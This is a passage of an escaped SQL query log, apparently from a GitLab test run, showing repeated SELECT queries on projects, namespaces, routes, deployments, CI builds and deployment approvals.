WHERE \"routes\".\"source_type\" = 'Namespace' AND \"routes\".\"source_id\" = 848 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"protected_environments\".* FROM \"protected_environments\" WHERE \"protected_environments\".\"project_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"alert_management_alerts\".* FROM \"alert_management_alerts\" WHERE (\"alert_management_alerts\".\"status\" IN (0,1)) AND \"alert_management_alerts\".\"environment_id\" IN (395, 396, 397) ORDER BY \"alert_management_alerts\".\"severity\" ASC, \"alert_management_alerts\".\"started_at\" DESC /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"prometheus_alerts\".* FROM \"prometheus_alerts\" WHERE \"prometheus_alerts\".\"id\" IN (10, 9, 8) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"deployments\".* FROM ((SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 395 AND \"deployments\".\"status\" = 2 ORDER BY \"deployments\".\"finished_at\" DESC LIMIT 1) UNION (SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 396 AND \"deployments\".\"status\" = 2 ORDER BY \"deployments\".\"finished_at\" DESC LIMIT 1) UNION (SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 397 AND \"deployments\".\"status\" = 2 ORDER BY \"deployments\".\"finished_at\" DESC LIMIT 1)) deployments /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 478 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"id\" IN (259, 261, 263) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds_metadata\".\"project_id\", \"ci_builds_metadata\".\"timeout\", \"ci_builds_metadata\".\"timeout_source\", \"ci_builds_metadata\".\"interruptible\", \"ci_builds_metadata\".\"config_options\", \"ci_builds_metadata\".\"config_variables\", \"ci_builds_metadata\".\"has_exposed_artifacts\", \"ci_builds_metadata\".\"environment_auto_stop_in\", \"ci_builds_metadata\".\"expanded_environment_name\", \"ci_builds_metadata\".\"secrets\", \"ci_builds_metadata\".\"build_id\", \"ci_builds_metadata\".\"id\", \"ci_builds_metadata\".\"runtime_runner_features\" FROM \"ci_builds_metadata\" WHERE \"ci_builds_metadata\".\"build_id\" IN (259, 261, 263) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (214, 216, 218) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) AND \"ci_builds\".\"when\" = 'manual' AND \"ci_builds\".\"status\" IN ('success', 'failed', 'canceled', 'skipped', 'manual') AND \"ci_builds\".\"commit_id\" IN (214, 216, 218) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) AND \"ci_builds\".\"when\" = 'delayed' AND \"ci_builds\".\"status\" IN ('success', 'failed', 'canceled', 'skipped', 'scheduled') AND \"ci_builds\".\"commit_id\" IN (214, 216, 218) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"project_features\".* FROM \"project_features\" WHERE \"project_features\".\"project_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Project' AND \"routes\".\"source_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Namespace' AND \"routes\".\"source_id\" = 848 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"protected_environments\".* FROM \"protected_environments\" WHERE \"protected_environments\".\"project_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"deployment_approvals\".* FROM \"deployment_approvals\" WHERE \"deployment_approvals\".\"deployment_id\" IN (210, 212, 214) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"deployments\".* FROM ((SELECT DISTINCT ON (environment_id) deployments.* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 395 AND \"deployments\".\"status\" IN (6, 1) ORDER BY environment_id, deployments.id DESC LIMIT 1) UNION (SELECT DISTINCT ON (environment_id) deployments.* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 396 AND \"deployments\".\"status\" IN (6, 1) ORDER BY environment_id, deployments.id DESC LIMIT 1) UNION (SELECT DISTINCT ON (environment_id) deployments.* FROM \"deployments\" WHERE \"deployments\".\"environment_id\" = 397 AND \"deployments\".\"status\" IN (6, 1) ORDER BY environment_id, deployments.id DESC LIMIT 1)) deployments /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" = 478 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"id\" IN (264, 260, 262) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds_metadata\".\"project_id\", \"ci_builds_metadata\".\"timeout\", \"ci_builds_metadata\".\"timeout_source\", \"ci_builds_metadata\".\"interruptible\", \"ci_builds_metadata\".\"config_options\", \"ci_builds_metadata\".\"config_variables\", \"ci_builds_metadata\".\"has_exposed_artifacts\", \"ci_builds_metadata\".\"environment_auto_stop_in\", \"ci_builds_metadata\".\"expanded_environment_name\", \"ci_builds_metadata\".\"secrets\", \"ci_builds_metadata\".\"build_id\", \"ci_builds_metadata\".\"id\", \"ci_builds_metadata\".\"runtime_runner_features\" FROM \"ci_builds_metadata\" WHERE \"ci_builds_metadata\".\"build_id\" IN (260, 262, 264) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (215, 217, 219) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) AND \"ci_builds\".\"when\" = 'manual' AND \"ci_builds\".\"status\" IN ('success', 'failed', 'canceled', 'skipped', 'manual') AND \"ci_builds\".\"commit_id\" IN (215, 217, 219) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) AND \"ci_builds\".\"when\" = 'delayed' AND \"ci_builds\".\"status\" IN ('success', 'failed', 'canceled', 'skipped', 'scheduled') AND \"ci_builds\".\"commit_id\" IN (215, 217, 219) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"project_features\".* FROM \"project_features\" WHERE \"project_features\".\"project_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Project' AND \"routes\".\"source_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_type\" = 'Namespace' AND \"routes\".\"source_id\" = 848 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"protected_environments\".* FROM \"protected_environments\" WHERE \"protected_environments\".\"project_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"deployment_approvals\".* FROM \"deployment_approvals\" WHERE \"deployment_approvals\".\"deployment_id\" IN (215, 211, 213) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"users\".* FROM \"users\" WHERE \"users\".\"id\" IN (479, 481, 483) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 371 AND \"routes\".\"source_type\" = 'Project' LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 371 AND \"routes\".\"source_type\" = 'Project' LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       WITH RECURSIVE \"base_and_ancestors\" AS ((SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = 848)\n       UNION\n       (SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", 